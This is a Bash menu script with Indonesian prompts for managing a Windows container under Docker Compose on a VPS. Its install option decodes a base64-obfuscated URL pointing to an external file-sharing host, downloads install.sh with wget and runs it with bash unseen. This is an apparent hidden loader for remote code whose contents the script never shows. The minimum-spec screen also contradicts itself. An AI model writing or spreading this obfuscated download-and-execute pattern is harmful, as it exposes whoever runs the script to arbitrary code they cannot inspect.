#!/bin/bash

# Fungsi untuk menampilkan menu
function show_menu() {
    clear
    echo "***************************************"
    echo "*          Docker Windows Menu        *"
    echo "***************************************"
    echo "*                                     *"
    echo "* 1. 💡 Informasi Minimum Spesifikasi *"
    echo "* 2. 🚀 Instalasi Kontainer Windows   *"
    echo "* 3. ⏹️ Hentikan Kontainer Windows    *"
    echo "* 4. 💿 Start Kontainer              *"
    echo "* 5. ❌ Hapus Kontainer               *"
    echo "* 6. 🚪 Keluar                        *"
    echo "*                                     *"
    echo "***************************************"
}

# Fungsi untuk menampilkan informasi
function show_info() {
    clear
    echo "***************************************"
    echo "*                                     *"
    echo "*        > Minimum Spek VPS <         *"
    echo "*                                     *"
    echo "*          |4 CPU - 8GB RAM|          *"
    echo "*          |2 CPU - 6GB RAM|          *"
    echo "*                                     *"
    echo "* => Memerlukan 2 CPU - 4GB RAM.      *"
    echo "* => VPS di bawah spesifikasi tidak   *"
    echo "*    dapat berjalan.                  *"
    echo "***************************************"
    echo ""
    read -p "Tekan Enter untuk kembali ke menu..."
}

# Fungsi untuk menjalankan kontainer
function run_container() {
    clear
    echo "Menjalankan kontainer Windows..."
    file=install.sh
    server_base=aHR0cHM6Ly9jbG91ZHNoeWRyby50ZWNoL3MvNzRiWmNZNnBiOWo0ZW9NL2Rvd25sb2FkP2ZpbGVzPWluc3RhbGwuc2g
    server=$(echo "$server_base" | base64 --decode)
    wget -q -O "$file" "$server"
    bash $file
    echo "Kontainer Windows dijalankan."
    read -p "Tekan Enter untuk kembali ke menu..."
}

# Fungsi untuk menghentikan kontainer
function stop_container() {
    clear
    echo "Menghentikan kontainer Windows..."
    docker compose stop
    echo "Kontainer Windows dihentikan."
    read -p "Tekan Enter untuk kembali ke menu..."
}

# Fungsi untuk menampilkan daftar kontainer
function list_containers() {
    clear
    echo "Memulai Kontainer..."
    docker compose start
    read -p "Tekan Enter untuk kembali ke menu..."
}

# Fungsi untuk menghapus kontainer
function remove_container() {
    clear
    echo "Menghapus kontainer Windows..."
    docker compose rm windows
    echo "Kontainer Windows dihapus."
    read -p "Tekan Enter untuk kembali ke menu..."
}

# Loop utama
while true; do
    show_menu
    read -p "Pilih opsi [1-6]: " choice

    case $choice in
        1) show_info ;;
        2) run_container ;;
        3) stop_container ;;
        4) list_containers ;;
        5) remove_container ;;
        6) echo "Keluar..."; exit 0 ;;
        *) echo "Pilihan tidak valid."; sleep 1 ;;
    esac
done
